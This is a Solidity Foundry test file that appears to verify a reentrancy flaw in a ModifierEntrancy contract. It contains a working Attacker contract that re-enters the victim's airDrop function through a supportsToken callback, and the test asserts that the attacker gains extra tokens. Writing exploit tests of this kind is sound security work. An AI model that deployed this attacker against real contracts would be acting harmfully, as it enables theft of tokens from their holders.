
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, attack as AttackContract} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // No ETH used in this scenario; keep fuzz arg but unused.
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );

        // Prove the victim contract state is inconsistent: attacker has > 20 tokens.
        uint256 bal = _contractUnderTest.tokenBalance(address(_attacker));
        assertGt(bal, 20, "Attacker did not gain extra tokens via reentrancy");
    }

    receive() external payable {}
}

contract Attacker {
    ModifierEntrancy public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) {
        _victim = ModifierEntrancy(victimAddress);
    }

    function setupAttack(uint256) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
    }

    function attack(uint256) public {
        initialSnapshot = _victim.tokenBalance(address(this));
        _victim.airDrop();

        uint256 finalBal = _victim.tokenBalance(address(this));
        if (attackCallCount > 1 && finalBal > initialSnapshot + 20) {
            exploitSucceeded = true;
        }
    }

    function supportsToken() external returns (bytes32) {
        // This function is called in the modifier before state is updated,
        // allowing us to re-enter airDrop.
        if (attackCallCount == 0) {
            attackCallCount += 1;
            _victim.airDrop();
        } else {
            attackCallCount += 1;
        }
        return keccak256(abi.encodePacked("Nu Token"));
    }

    receive() external payable {}
}
